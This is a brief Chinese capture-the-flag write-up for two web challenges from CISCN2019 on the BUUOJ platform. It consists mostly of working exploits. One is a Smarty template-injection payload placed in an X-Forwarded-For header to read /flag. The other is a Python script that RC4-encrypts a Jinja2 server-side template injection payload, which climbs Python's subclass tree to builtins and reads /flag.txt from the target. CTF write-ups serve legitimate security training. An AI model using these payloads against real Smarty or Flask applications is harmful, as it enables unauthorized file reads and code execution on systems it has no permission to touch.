# [CISCN2019 华东南赛区]

## Web11

控制XFF头
Smarty 注入

payload:

```
X-Forwarded-For: {if print_r(file_get_contents("/flag"))}{/if}
```

## Double Secret

访问secret传secret参，可以加密

试着试着就报错了，然后看到了部分源码

```python
File "/app/app.py", line 35, in secret
    if(secret==None):
        return 'Tell me your secret.I will encrypt it so others can\'t see'
    rc=rc4_Modified.RC4("HereIsTreasure")   #解密
    deS=rc.do_crypt(secret)
 
    a=render_template_string(safe(deS))
 
    if 'ciscn' in a.lower():
        return 'flag detected!'
    return a
 
```

rc4后ssti咯

从网上找个rc4的类

```python
import requests
import urllib

class RC4:
    def __init__(self, key):
        self.key = key
        self.key_length = len(key)
        self._init_S_box()

    def _init_S_box(self):
        self.Box = [i for i in range(256)]
        k = [self.key[i % self.key_length] for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + self.Box[i] + ord(k[i])) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]

    def crypt(self, plaintext):
        i = 0
        j = 0
        result = ''
        for ch in plaintext:
            i = (i + 1) % 256
            j = (j + self.Box[i]) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]
            t = (self.Box[i] + self.Box[j]) % 256
            result += chr(self.Box[t] ^ ord(ch))
        return result

url='http://2157fe47-3cf2-426f-acba-856acd78bd84.node3.buuoj.cn/secret?secret='
key = RC4('HereIsTreasure')
cmd="{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag.txt', 'r').read() }}{% endif %}{% endfor %}"
payload = urllib.parse.quote(key.crypt(cmd))
res = requests.get(url + payload)
print(res.text)
```